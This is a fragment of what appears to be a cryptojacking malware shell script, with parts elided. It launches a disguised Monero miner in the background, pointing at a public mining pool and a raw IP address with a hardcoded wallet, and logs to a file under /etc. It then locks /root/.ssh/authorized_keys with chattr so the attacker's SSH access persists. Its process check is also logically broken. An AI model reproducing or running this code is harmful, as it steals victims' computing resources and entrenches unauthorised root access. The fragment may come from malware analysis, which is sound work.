...
if [ -f "$rtdir" ]; then
    ...
    if ! $ps_cmd -fe | grep -q 'nginx' | grep -v 'grep'; then
        ...
        sleep 5s
        ./ --log-file=/etc/kta --keepalive --no-color --cpu-priority 5 -o pool.supportxmr.com:443 --tls -o 80.211.206.105:9000 -u 44UASB7gTUKFQq69X8Cf8bR6Wzb91j17H55j88BfZmozXyKEsRze6v4LnWN8pDMGX8QNvGs9tTao16CnSRvAH1L7665oGxM --coin monero --background &
    fi
    chmod 600 /root/.ssh/authorized_keys
    chattr +ia /root/.ssh/authorized_keys
else
